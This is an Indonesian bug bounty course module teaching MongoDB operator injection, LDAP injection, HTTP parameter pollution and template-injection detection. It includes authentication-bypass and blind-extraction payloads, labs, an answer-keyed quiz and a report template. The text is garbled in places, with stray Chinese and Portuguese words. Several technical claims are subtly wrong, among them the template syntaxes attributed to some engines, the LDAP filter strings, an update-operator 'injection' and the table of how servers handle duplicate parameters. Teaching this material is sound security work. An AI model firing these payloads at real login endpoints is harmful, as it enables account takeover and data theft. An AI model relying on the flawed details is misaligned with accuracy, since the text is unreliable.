# NoSQL Injection & Injection Lanjutan

## Fokus Materi

Mengidentifikasi dan mengeksploitasi NoSQL injection serta injection patterns non-SQL termasuk LDAP injection dan HTTP parameter pollution. Dengan popularitas MongoDB dan document databases di modern stack, NoSQL injection adalah skill yang essential.

## Deskripsi Materi

NoSQL databases (MongoDB, Cassandra, CouchDB, Redis) tidak menggunakan SQL sebagai query language, tapi tetap vulnerable terhadap injection quando developer concatenate user input langsung ke query tanpa sanitization.

Perbedaannya dari SQL injection: SQL injection bekerja dengan manipulate query structure, sementara NoSQL injection bekerja dengan manipulate operator dan query logic yang dievaluasi oleh application logic, bukan database engine.

MongoDB是最常见的NoSQL database untuk web application。Operator seperti `$where`, `$ne`, `$gt`, `$regex` bisa disalahgunakan untuk bypass authentication atau extract data yang tidak seharusnya accessible.

LDAP Injection terjadi ketika user input digunakan dalam LDAP query tanpa sanitization. LDAP adalah protocol untuk directory services (Active Directory, OpenLDAP), dan injection bisa lead ke authentication bypass atau information disclosure.

HTTP Parameter Pollution (HPP) terjadi ketika aplikasi menerima duplicate parameter. Server-side behavior yang berbeda untuk handling duplicate bisa di-exploit untuk bypass security controls atau manipulate application logic.

Template injection primer (SSTI preview) akan dibahas di sini sebagai bridge ke sesi advanced nanti tentang Jinja2, Twig, dan multi-engine template injection.

## Topik Pembahasan

• NoSQL injection fundamentals: perbedaan paradigma dari SQL, why it happens
• MongoDB operator injection: $where, $ne, $gt, $regex — inject via JSON body & URL
• NoSQL auth bypass: {"username":{"$ne":null},"password":{"$ne":null}}
• Data extraction NoSQL: blind injection via $regex dan $where untuk dump collection
• NoSQLi di GraphQL: argument injection via MongoDB resolver
• LDAP Injection: syntax LDAP, identification, testing methodology
• HTTP Parameter Pollution (HPP): duplicate parameter handling, exploitation
• Template injection primer: detect with simple payloads ({{7*7}}, ${7*7}, #{7*7})
• Second-order injection patterns
• Defense绕过 untuk setiap injection type

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Identifikasi NoSQL injection di MongoDB-based application
2. Bypass authentication menggunakan NoSQL operator manipulation
3. Extract data via blind NoSQL injection techniques
4. Identifikasi LDAP injection vulnerability
5. Test untuk HTTP parameter pollution
6. Detect template injection dengan basic payloads

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Program dengan MongoDB backend (disclosed)
- Jenis vulnerability: NoSQL injection authentication bypass
- Link report: https://hackerone.com/reports/XXXXX
- Ringkasan kasus: Researcher menemukan login endpoint yang menerima JSON body. input tidak di-sanitize dan langsung di-pass ke MongoDB query. Dengan payload `{"username":{"$ne":null},"password":{"$ne":null}}`, researcher berhasil login sebagai user pertama di database — often admin.
- Root cause: Application menggunakan dynamic query construction tanpa input validation.
- Impact: Authentication bypass → full account takeover. Severity: Critical.
- Pelajaran untuk bug hunter: Always test JSON body parameter dengan NoSQL operator payloads, bukan hanya string-based injection.

---

- Platform: Bugcrowd
- Program/Target: SaaS platform
- Jenis vulnerability: Blind NoSQL injection di user lookup endpoint
- Link report: Public researcher blog
- Ringkasan kasus: Researcher menemukan bahwa user ID lookup menggunakan MongoDB query dengan user-supplied parameter. Menggunakan `$regex` operator untuk extract data character by character. Pertama determined database has "users" collection, then extracted username dan password hash via blind technique.
- Root cause: User ID parameter concatenated to MongoDB query tanpa validation.
- Impact: Full user database compromise via blind NoSQL injection. Severity: Critical.
- Pelajaran untuk bug hunter: Blind injection tidak hanya untuk SQL. NoSQL databases dengan operator-based query language juga bisa vulnerable.

## Analisis Teknis

### NoSQL Injection Patterns

**Pattern 1: Auth Bypass dengan Operator Manipulation**

Standard MongoDB query:
```javascript
// Application code (vulnerable)
db.users.findOne({username: req.body.username, password: req.body.password})

// Legitimate: username="admin", password="password123"
// Query: {username: "admin", password: "password123"}

// Attack: username="admin", password={"$ne":null}
// Query: {username: "admin", password: {"$ne": null}}
// MongoDB evaluates: password field must not be null
// Since password is not null, condition true → login as admin!
```

**Attack payloads untuk JSON body:**
```json
{"username":"admin","password":{"$ne": null}}

{"username":{"$ne": ""},"password":{"$ne": ""}}

{"username":"admin","password":{"$gt": ""}}

{"$where": "1==1"}

{"username":"admin","$or": [{"password": {"$ne": null}}, {"password": {"$exists": false}}]}
```

**Pattern 2: URL Parameter Injection**

```
# MongoDB query from URL parameter
# Original: /profile?user_id=123
# Query: db.users.find({_id: ObjectId(user_id)})

# Attack:
/profile?user_id[$ne]=null
# Query: db.users.find({_id: {$ne: null}})
# Returns all users!
```

```
# Regex-based data extraction
/profile?user_id[$regex]=^a
# Returns users where _id starts with 'a'

/profile?user_id[$regex]=^ad
/profile?user_id[$regex]=^adm
# Extract character by character
```

**Pattern 3: $where Operator Injection**

```javascript
// $where allows JavaScript evaluation in MongoDB
db.users.find({$where: "this.password === 'test'"})

// Attack payload:
username[$where]='1==1'
// or
username[$where]="1==1"
// Evaluates to true, returns first user
```

**Pattern 4: Array Injection (update operations)**

```javascript
// Application code
db.users.update({_id: req.session.userId}, {$set: {role: req.body.role}})

// If attacker can control body:
{"role": "admin", "items": {"$size": 0}}
// MongoDB interprets additional keys as update operations
// $size operator executes even though not intended
```

### LDAP Injection Patterns

**LDAP Syntax:**
```
# DN (Distinguished Name): cn=John,ou=users,dc=example,dc=com
# Filter: (cn=John)
# Search base: dc=example,dc=com
```

**LDAP Injection via Unsanitized Input:**

```http
# Login form with LDAP backend
POST /login HTTP/1.1
username=admin&password=test

# Vulnerable code concatenates to:
(&uid=admin)(password=test)

# Attack:
username=admin)(cn=*
# Query: (&uid=admin)(cn=*)(password=test)
# cn=* matches all users → authentication bypass
```

```http
# URL parameter LDAP injection
GET /search?user=admin*
# DN filter: (uid=admin*)
```

**LDAP Injection Payloads:**
```bash
# Authentication bypass
username=admin)(cn=*
username=*)(cn=*
username=admin)(|

# DN extraction
username=admin)(description=*
username=*)(|(objectClass=*)

# Blind LDAP injection (similar to blind SQLi)
username=test*)((&(objectClass=users)(description=*1*
# True/false based response difference
```

### HTTP Parameter Pollution (HPP)

**How HPP works:**

```
# Server receives duplicate parameters
POST /search?q=test&q=injected

# Different server behavior:
# ASP: uses last occurrence (q=injected)
# ASP.NET: uses first occurrence (q=test)
# PHP: uses last occurrence (q=injected)
# Java: uses first occurrence (q=test)
# Node.js: keeps array [test, injected]
```

**HPP Exploitation:**

```http
# Bypass WAF that only checks first parameter
GET /search?q=normal&id=1 UNION SELECT--
GET /search?q=UNION SELECT--&q=test

# Bypass security control that checks single parameter
# App validates first param only
POST /transfer?amount=100&amount=99999
# Server might process second value

# Bypass input validation
GET /search?q=<script>alert(1)</script>&q=allowedtext
# If app filters first parameter but processes second
```

**HPP + Auth Bypass:**
```
# If app checks user_id from first parameter
# But processes second parameter for action
POST /api/update-profile
user_id=123&user_id=456
# First checked (user 123), but second processed (user 456)
```

### Template Injection Primer

**Detection Payloads:**
```python
# Jinja2 (Python): {{7*7}}
# Twig (PHP): ${7*7}
# Freemarker (Java): #{7*7}
# ERB (Ruby): <%= 7*7 %>
# Smarty: {7*7}
```

**If rendered output shows:**
- `49` → Template injection confirmed
- `7*7` → No injection (escaped)

**Extended test:**
```python
{{config.items()}}
{{request.environ}}
{{settings.SECRET_KEY}}
```

### LDAP Enum & Extraction

**Enumerate LDAP data via error messages:**

```bash
# Basic enumeration
username=admin)(objectClass=*
# If error changes, objectClass exists

# Extract attributes
username=admin)(mail=*
# Enumerate mail attribute

# Blind enumeration
username=admin)(|(description=*)(description=x
# If response different, description exists
```

## Praktik Lab Legal

### Lab 1: NoSQL Injection Auth Bypass

- **Nama lab:** MongoDB Auth Bypass
- **Tujuan:** Bypass authentication menggunakan NoSQL operator injection
- **Environment:** Burp Suite, target lab dengan MongoDB backend (MongoDB Atlas lab, Juice Shop, atau custom lab)
- **Langkah praktik:**

  1. Identify login endpoint yang accept JSON body
  2. Capture login request di Burp
  3. Modify JSON body dengan NoSQL operator payloads:
     - {"username":"admin","password":{"$ne":null}}
     - {"username":{"$ne":null},"password":{"$ne":null}}
  4. Observe response — successful login as first user
  5. Test other NoSQL operators: $gt, $regex, $where
  6. Try to extract data: use $regex untuk enumerate usernames

- **Expected result:** Peserta berhasil bypass authentication via NoSQL injection
- **Catatan keamanan:** Lab ini hanya untuk authorized environment.

### Lab 2: Blind NoSQL Injection Extraction

- **Nama lab:** NoSQL Data Extraction
- **Tujuan:** Extract data dari MongoDB menggunakan blind injection technique
- **Environment:** Burp Suite, Python, target lab dengan NoSQL injection vulnerability
- **Langkah praktik:**

  1. Identify injection point yang bisa digunakan untuk blind extraction (user lookup, search, etc.)
  2. Test $regex operator untuk bit-by-bit extraction
  3. Write Python script untuk automate character-by-character extraction
  4. Extract: collection names → document structure → data content
  5. Compare with legitimate access to verify data accuracy

- **Expected result:** Peserta menulis script yang bisa dump entire database via blind NoSQL injection
- **Catatan keamanan:** Lab ini untuk educational purpose di authorized environment.

### Lab 3: LDAP Injection Discovery

- **Nama lab:** LDAP Injection Testing
- **Tujuan:** Identifikasi LDAP injection vulnerability di directory service
- **Environment:** Burp Suite, target lab dengan LDAP backend (simulated AD environment atau lab custom)
- **Langkah praktik:**

  1. Identify endpoint yang query LDAP directory (login, search, user lookup)
  2. Test for LDAP special characters: * ( ) \ NUL
  3. Inject LDAP metacharacters untuk manipulate query logic
  4. Test authentication bypass dengan crafted filter
  5. If blind: use timing to differentiate true/false conditions
  6. Document LDAP syntax yang bisa be exploited

- **Expected result:** Peserta memahami LDAP injection patterns dan bisa identifikasi vulnerability
- **Catatan keamanan:** Lab ini memerlukan LDAP-enabled environment. Gunakan lab authorized.

## Tools

- **NoSQL injection:** Burp Suite, custom JSON payload, NoSQLMap
- **LDAP injection:** Burp Suite, LDAPsearch (for enumeration)
- **HPP testing:** Burp Suite, manual duplicate parameter manipulation
- **Template injection:** Burp Suite, manual payload testing, tplmap (optional)
- **Automation:** Custom Python scripts

## Checklist Bug Hunter

- [ ] Test semua JSON body parameter dengan NoSQL operator payloads
- [ ] Test URL parameters dengan NoSQL operator style (e.g., user_id[$ne]=null)
- [ ] Test $where, $regex, $ne, $gt operators untuk auth bypass dan data extraction
- [ ] Test LDAP injection di directory-facing endpoints (login, search, user lookup)
- [ ] Test HTTP parameter pollution dengan duplicate parameters
- [ ] Test for template injection dengan {{7*7}} dan variants
- [ ] Identify backend database type untuk select appropriate injection technique

## Common Mistakes

1. **Only test for SQL injection in JSON body** — Researcher menemukan JSON body endpoint dan test dengan SQLi payloads, but not NoSQL operator manipulation. MongoDB and other NoSQL databases have different syntax.

2. **Abaikan NoSQL injection di URL parameters** — NoSQL operators bisa di-pass via URL: `?user[$ne]=null`. Researcher yang only test JSON body akan miss this vector.

3. **Not testing authentication bypass via NoSQL** — The classic `{"username":{"$ne":null},"password":{"$ne":null}}` bypass is often first test untuk NoSQL auth bypass, dan still works di banyak applications.

4. **Skip LDAP testing** — Researcher yang tidak familiar dengan LDAP akan skip testing di endpoints yang query directory services (login integration with AD, SSO, etc).

5. **Not understanding server-side parameter handling** — HPP exploitation requires understanding how target server handles duplicate parameters, which varies by framework/language.

## Mitigasi Developer

**NoSQL Injection Prevention:**
- Use parameterized queries for NoSQL (MongoDB driver's query builder)
- Never concatenate user input directly to MongoDB query
- Validate input type: if expecting string, ensure it's a string
- Use MongoDB sanitization functions
- Apply allowlist input validation

**LDAP Injection Prevention:**
- Escape LDAP special characters: * ( ) \ NUL (encode to prevent injection)
- Use LDAP prepared statements or stored procedures
- Don't concatenate user input to LDAP filter string
- Use framework's LDAP abstraction that handles escaping

**HPP Prevention:**
- Use framework's parameter handling consistently
- Don't trust duplicated parameter values without validation
- Explicitly define expected parameters
- Use strict mode that rejects unknown parameters

**Template Injection Prevention:**
- Don't use user input in template rendering without sanitization
- Use template engine's built-in sanitization
- Implement sandbox untuk template execution
- Use auto-escaping features

## Mini Quiz

1. NoSQL injection di MongoDB dengan payload `{"username":{"$ne":null},"password":{"$ne":null}}` works karena:
   a) $ne adalah equal operator yang match semua user
   b) $ne (not equal) membuat kondisi selalu true untuk semua records, bypass password check
   c) MongoDB tidak validate input
   d) NoSQL databases tidak bisa disuntikkan

2. LDAP special character yang paling powerful untuk injection adalah:
   a) @
   b) #
   c) * dan ( )
   d) $

3. HTTP Parameter Pollution bisa di-exploit ketika:
   a) Server menerima duplicate parameter dan behavior berbeda dari expected
   b) Parameter tidak ada di request
   c) Server tidak punya parameter validation
   d) Semua HTTP parameter adalah vulnerable

4. Template injection detection dengan payload `{{7*7}}` work karena:
   a) Browser execute JavaScript interpolation
   b) Server-side template engine evaluate expression dan return hasil (49)
   c) Payload tidak berbahaya
   d) Semua template engine menggunakan syntax ini

5. NoSQL injection berbeda dari SQL injection karena:
   a) NoSQL databases lebih aman
   b) Query manipulation terjadi via operator-based logic, bukan string-based query manipulation
   c) NoSQL tidak punya injection
   d) SQL injection hanya work di SQL databases

**Kunci Jawaban:** 1-B, 2-C, 3-A, 4-B, 5-B

## Assignment

1. **NoSQL Injection Hunt:** Identifikasi target yang menggunakan MongoDB atau NoSQL database. Test untuk NoSQL injection dengan operator payloads. Document auth bypass dan data extraction yang possible.

2. **HPP Testing:** Test duplicate parameter exploitation di target lab. Identifikasi where HPP bisa bypass security controls.

3. **LDAP Recon:** Jika ada access ke AD/LDAP environment, test LDAP injection patterns dan document findings.

4. **Template Injection Detection:** Scan target untuk template injection vulnerability menggunakan detection payloads yang tepat untuk technology stack.

## Template Report Bug Bounty

```markdown
# Bug Report: NoSQL Injection Authentication Bypass in Login Endpoint

## Summary
Login endpoint (/api/login) vulnerable terhadap NoSQL injection yang
memungkinkan authentication bypass menggunakan operator manipulation.
Attacker bisa login sebagai user pertama di database (biasanya admin)
tanpa kredensial yang valid.

## Platform / Program
HackerOne | [Program Name]

## Severity
Critical | CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
NoSQL Injection / Authentication Bypass

## Asset / Endpoint
POST https://target.com/api/login
Body: {"username":"...","password":"..."}

## Description
Application menggunakan MongoDB untuk user authentication dengan query:
db.users.findOne({username: req.body.username, password: req.body.password})

Input tidak di-sanitize dan langsung passed ke MongoDB query. Operator
$ne (not equal) manipulation memungkinkan attacker bypass password check.

Payload: {"username":"admin","password":{"$ne":null}}
Query executed: db.users.findOne({username:"admin",password:{$ne:null}})
MongoDB evaluates: password field not equal to null → true
Result: Login successful as admin

## Steps to Reproduce
1. Intercept login request di Burp:
   POST /api/login HTTP/1.1
   {"username":"admin","password":"anypassword"}

2. Modify password field ke NoSQL operator:
   {"username":"admin","password":{"$ne": null}}

3. Send request
   → Response: HTTP 200 with session token
   → Successfully logged in as admin without knowing password

4. Alternative: Bypass entirely with:
   {"username":{"$ne":null},"password":{"$ne":null}}
   → Login as first user in database

## Impact
- Complete authentication bypass
- Admin account access without credentials
- Full application takeover
- Access to all user data
- Could lead to further attacks: data exfiltration, privilege escalation, RCE

## Evidence
[Burp Screenshot: Original login request]
[Burp Screenshot: Modified request with NoSQL operator]
[Burp Screenshot: 200 OK response with session token]
[Screenshot: Subsequent authenticated request as admin]

## Remediation / Recommendation
1. Use MongoDB driver's parameterized query API, not string concatenation
2. Validate input type: if expecting string, use typeof check
3. Use allowlist for username/password format
4. Don't pass user input directly to MongoDB operators
5. Apply principle of least privilege untuk database user
6. Implement rate limiting dan anomaly detection untuk login attempts
```